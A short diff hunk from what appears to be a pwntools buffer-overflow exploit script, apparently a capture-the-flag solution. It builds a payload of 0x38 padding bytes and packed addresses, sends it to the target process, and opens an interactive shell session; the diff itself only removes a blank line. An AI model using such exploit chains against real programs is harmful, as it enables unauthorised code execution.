@@ -14,6 +14,5 @@ chain = ("i" * 0x38) + "".join(map(p64,[
     0,
     0x4005aa,
 ]))
-
 p.sendline(chain)
 p.interactive()
